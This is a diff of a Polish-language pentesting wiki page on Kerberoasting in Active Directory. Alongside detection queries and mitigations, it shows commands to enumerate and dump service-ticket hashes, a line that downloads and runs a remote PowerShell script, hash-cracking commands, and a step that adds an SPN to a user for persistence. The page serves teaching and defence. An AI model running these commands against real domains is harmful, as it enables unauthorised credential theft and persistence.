@@ -1,43 +1,44 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
 Otrzymaj dostęp już dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Zacznij od zera i stań się ekspertem w hakowaniu AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
 
 ## Kerberoast
 
-Kerberoasting koncentruje się na pozyskiwaniu biletów **TGS**, szczególnie tych związanych z usługami działającymi na kontach **użytkowników** w **Active Directory (AD)**, wyłączając konta komputerowe. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **haseł użytkowników**, co umożliwia **offlineowe łamanie poświadczeń**. Użycie konta użytkownika jako usługi wskazuje na niepusty atrybut **"ServicePrincipalName"**.
+Kerberoasting koncentruje się na pozyskiwaniu **biletów TGS**, szczególnie tych związanych z usługami działającymi na kontach **użytkowników** w **Active Directory (AD)**, wyłączając konta **komputerowe**. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **hasła użytkownika**, co umożliwia **offlineowe łamanie poświadczeń**. Użycie konta użytkownika jako usługi jest wskazane przez niepustą właściwość **"ServicePrincipalName"**.
 
-Do wykonania **Kerberoastingu** niezbędne jest konto domenowe zdolne do żądania biletów **TGS**, jednak ten proces nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego posiadającego **ważne poświadczenia domenowe**.
+Do wykonania **Kerberoastingu** niezbędne jest konto domeny zdolne do żądania **biletów TGS**; jednak ten proces nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego z **ważnymi poświadczeniami domeny**.
 
 ### Kluczowe punkty:
-- **Kerberoasting** koncentruje się na biletach **TGS** dla **usług na kontach użytkowników** w **AD**.
-- Bilety szyfrowane kluczami pochodzącymi z **haseł użytkowników** mogą być **offlineowo łamane**.
-- Usługa jest identyfikowana przez niepusty atrybut **ServicePrincipalName**.
-- Nie są wymagane **specjalne uprawnienia**, wystarczą **ważne poświadczenia domenowe**.
+
+* **Kerberoasting** celuje w **bilety TGS** dla **usług kont użytkowników** w **AD**.
+* Bilety szyfrowane kluczami z **haseł użytkowników** mogą być **łamane offline**.
+* Usługa jest identyfikowana przez **ServicePrincipalName**, który nie jest pusty.
+* Nie są wymagane **specjalne uprawnienia**, wystarczą **ważne poświadczenia domeny**.
 
 ### **Atak**
 
 {% hint style="warning" %}
-Narzędzia do **Kerberoastingu** zazwyczaj żądają **szyfrowania RC4** podczas wykonywania ataku i inicjowania żądań TGS-REQ. Wynika to z faktu, że **RC4 jest** [**słabszy**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i łatwiejszy do złamania offline za pomocą narzędzi takich jak Hashcat niż inne algorytmy szyfrowania, takie jak AES-128 i AES-256.\
+**Narzędzia do Kerberoastingu** zazwyczaj żądają **szyfrowania RC4** podczas ataku i inicjowania żądań TGS-REQ. Wynika to z faktu, że **RC4 jest** [**słabszy**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i łatwiejszy do złamania offline za pomocą narzędzi takich jak Hashcat niż inne algorytmy szyfrowania, takie jak AES-128 i AES-256.\
 Hasze RC4 (typ 23) zaczynają się od **`$krb5tgs$23$*`**, podczas gdy AES-256 (typ 18) zaczynają się od **`$krb5tgs$18$*`**.
 {% endhint %}
 
@@ -52,7 +53,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Wielofunkcyjne narzędzia, w tym wydruk użytkowników podatnych na atak kerberoast:
+### Narzędzia wielofunkcyjne obejmujące zrzut użytkowników podatnych na atak Kerberoast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -103,64 +104,63 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Podczas żądania TGS generowany jest zdarzenie systemowe Windows `4769 - Żądanie biletu usługi Kerberos`.
+Podczas żądania TGS generowany jest Windows event `4769 - A Kerberos service ticket was requested`.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), aby łatwo tworzyć i **automatyzować workflows** oparte na najbardziej zaawansowanych narzędziach społeczności.\
 Otrzymaj dostęp już dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-### Łamanie haseł
+### Cracking
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Wytrwałość
+### Trwałość
 
-Jeśli masz **wystarczające uprawnienia** dla danego użytkownika, możesz go uczynić podatnym na atak kerberoast:
+Jeśli masz **wystarczające uprawnienia** dla użytkownika, możesz go **zrobić kerberoastable**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
 Możesz znaleźć przydatne **narzędzia** do ataków **kerberoast** tutaj: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Jeśli napotkasz ten **błąd** na Linuxie: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Zbyt duża rozbieżność zegara)`**, oznacza to, że twój lokalny czas jest niezsynchronizowany z kontrolerem domeny (DC). Istnieje kilka opcji:
+Jeśli napotkasz ten **błąd** z systemu Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Zbyt duże odchylenie zegara)`**, oznacza to problem z czasem lokalnym, który należy zsynchronizować z kontrolerem domeny. Istnieje kilka opcji:
 
-* `ntpdate <IP DC>` - Przestarzałe od Ubuntu 16.04
-* `rdate -n <IP DC>`
+* `ntpdate <IP kontrolera domeny>` - Przestarzałe od wersji Ubuntu 16.04
+* `rdate -n <IP kontrolera domeny>`
 
-### Zapobieganie
+### Niwelowanie
 
-Atak kerberoast może być przeprowadzany z dużym stopniem skrytości, jeśli jest podatny na atak. Aby wykryć tę aktywność, należy zwrócić uwagę na **ID zdarzenia zabezpieczeń 4769**, które wskazuje na żądanie biletu Kerberos. Jednak ze względu na wysoką częstotliwość tego zdarzenia, należy zastosować konkretne filtry, aby wyodrębnić podejrzane działania:
+Atak **kerberoast** może być przeprowadzony z wysokim stopniem skrytości, jeśli jest podatny na eksploatację. Aby wykryć tę aktywność, należy zwrócić uwagę na **ID zdarzenia zabezpieczeń 4769**, które wskazuje, że żądano biletu Kerberos. Jednak ze względu na wysoką częstotliwość tego zdarzenia, należy zastosować konkretne filtry, aby wyodrębnić podejrzane działania:
 
-- Nazwa usługi nie powinna być **krbtgt**, ponieważ jest to normalne żądanie.
-- Nazwy usług kończące się na **$** powinny być wykluczone, aby nie uwzględniać kont maszynowych używanych do usług.
-- Żądania z maszyn powinny być odfiltrowane przez wykluczenie nazw kont sformatowanych jako **maszyna@domena**.
-- Należy uwzględnić tylko udane żądania biletów, które są identyfikowane przez kod błędu **'0x0'**.
-- **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, co często jest wykorzystywane w atakach kerberoast.
+* Nazwa usługi nie powinna być **krbtgt**, ponieważ jest to normalne żądanie.
+* Nazwy usług kończące się na **$** powinny być wykluczone, aby uniknąć uwzględniania kont komputerowych używanych do usług.
+* Żądania z maszyn powinny być odfiltrowane poprzez wykluczenie nazw kont sformatowanych jako **maszyna@domena**.
+* Należy rozważyć jedynie udane żądania biletów, zidentyfikowane przez kod błędu **'0x0'**.
+* **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, co często jest wykorzystywane w atakach kerberoast.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Aby zmniejszyć ryzyko związane z Kerberoastingiem:
+Aby zmniejszyć ryzyko Kerberoastingu:
 
-- Upewnij się, że **Hasła kont usług** są trudne do odgadnięcia, zaleca się długość powyżej **25 znaków**.
-- Wykorzystaj **Zarządzane konta usług**, które oferują korzyści takie jak **automatyczne zmiany hasła** i **delegowane zarządzanie nazwą główną usługi (SPN)**, zwiększając bezpieczeństwo przed tego rodzaju atakami.
+* Upewnij się, że **Hasła kont usług** są trudne do odgadnięcia, zaleca się długość powyżej **25 znaków**.
+* Wykorzystaj **Zarządzane konta usług**, które oferują korzyści takie jak **automatyczne zmiany hasła** i **delegowane zarządzanie nazwami usługodawców (SPN)**, zwiększając bezpieczeństwo przed tego rodzaju atakami.
 
-Wdrożenie tych środków pozwala organizacjom znacznie zmniejszyć ryzyko związane z Kerberoastingiem.
-
+Poprzez wdrożenie tych środków organizacje mogą znacząco zmniejszyć ryzyko związane z Kerberoastingiem.
 
 ## Kerberoast bez konta domeny
 
-We wrześniu 2022 roku, badacz o nazwie Charlie Clark ujawnił nowy sposób wykorzystania systemu, który został opublikowany na jego platformie [exploit.ph](https://exploit.ph/). Ta metoda umożliwia pozyskanie **Biletów Usług (ST)** za pomocą żądania **KRB_AS_REQ**, które nie wymaga kontroli nad żadnym kontem Active Directory. W zasadzie, jeśli podmiot jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji - scenariusz podobny do tego, co jest znane w świecie cyberbezpieczeństwa jako atak **AS-REP Roasting** - ta cecha może być wykorzystana do manipulowania procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w ciele żądania, system jest wprowadzany w błąd, aby wydał **ST** zamiast standardowego zaszyfrowanego Biletu Granting Ticket (TGT).
+We **wrześniu 2022** roku, nowy sposób eksploatacji systemu został ujawniony przez badacza o nazwie Charlie Clark, udostępniony poprzez jego platformę [exploit.ph](https://exploit.ph/). Ta metoda umożliwia pozyskanie **Biletów Usługi (ST)** poprzez żądanie **KRB\_AS\_REQ**, co nie wymaga kontroli nad żadnym kontem Active Directory. W zasadzie, jeśli podmiot jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji - scenariusz podobny do znanego w świecie cyberbezpieczeństwa jako atak **AS-REP Roasting** - ta cecha może być wykorzystana do manipulacji procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w ciele żądania, system jest zmylany do wydania **ST** zamiast standardowego zaszyfrowanego Biletu Granting Ticket (TGT).
 
-Technika ta jest w pełni wyjaśniona w tym artykule: [wpis na blogu Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+Technika jest w pełni wyjaśniona w tym artykule: [wpis na blogu Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 {% hint style="warning" %}
-Musisz podać listę użytkowników, ponieważ nie mamy poprawnego konta do zapytania LDAP przy użyciu tej techniki.
+Musisz podać listę użytkowników, ponieważ nie mamy ważnego konta do zapytania LDAP za pomocą tej techniki.
 {% endhint %}
 
 #### Linux
@@ -175,7 +175,8 @@ GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "d
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
-## Odwołania
+## Odnośniki
+
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
@@ -186,18 +187,18 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji workflowów** z wykorzystaniem najbardziej zaawansowanych narzędzi społeczności.\
 Otrzymaj dostęp już dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
